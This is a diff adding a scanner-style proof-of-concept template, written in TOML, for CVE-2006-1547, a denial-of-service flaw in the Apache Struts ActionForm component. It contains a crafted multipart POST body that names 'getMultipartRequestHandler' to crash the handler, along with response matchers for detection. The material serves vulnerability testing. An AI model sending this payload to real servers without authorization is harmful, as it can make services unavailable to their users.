@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "Apache Struts 1.2.9 之前版本 ActionForm 组件存在拒绝服务漏洞。通过发送特制的 multipart/form-data 编码表单请求，参数名引用 getMultipartRequestHandler 公共方法，触发 CommonsMultipartRequestHandler 内部异常导致服务不可用。"
+id = "POC-AVE-2006-0008"
+name = "Apache Struts ActionForm 拒绝服务漏洞 PoC"
+severity = "high"
+tags = ["ave-2006-0008"]
+vuln_id = [
+    "CVE-2006-1547",
+    "AVE-2006-0008",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/your-struts-action.do"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundary7MA4YWxkTrZu0gW\r
+Content-Disposition: form-data; name="getMultipartRequestHandler"\r
+\r
+\r
+------WebKitFormBoundary7MA4YWxkTrZu0gW--"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "Exception",
+    "null",
+]
